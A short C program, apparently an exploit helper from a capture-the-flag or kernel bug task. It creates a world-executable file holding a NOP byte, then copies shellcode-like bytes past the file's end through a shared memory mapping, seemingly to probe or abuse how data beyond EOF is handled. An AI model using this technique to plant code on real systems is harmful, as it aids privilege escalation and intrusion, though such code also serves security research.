#define _GNU_SOURCE
#include <sched.h>
#include <err.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>

#define MIN(a, b) ({        \
    __typeof__(a) _a = (a); \
    __typeof__(b) _b = (b); \
    _a < _b ? _a : _b;      \
})

#define CHECK(x) ({                         \
    __typeof__(x) _x = (x);                 \
    if (_x == -1) {                         \
        err(1, "failure at %d", __LINE__);  \
    }                                       \
    _x;                                     \
})

#define EXPECT(x, v) ({                                         \
    __typeof__(x) _x = (x);                                     \
    if (_x != (v)) {                                            \
        errx(1, "unexpected value returned at %d", __LINE__);   \
    }                                                           \
    _x;                                                         \
})

char buf[0x100];
int main(int argc,char** argv){
	int sc = open(argv[1],0);
	read(sc,buf,0x100);
	close(sc);
        int fd = CHECK(open(argv[2], O_RDWR | O_CREAT | O_EXCL, 0777));
        write(fd,"\x90",1);
	//ftruncate(fd,0x1);
        char* ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        //msync(ptr,0x1000,MS_SYNC);
        //memset(ptr,'\x90',0x1);
	memcpy(&ptr[1],buf,0x100);
	close(fd);
        exit(0);	

}

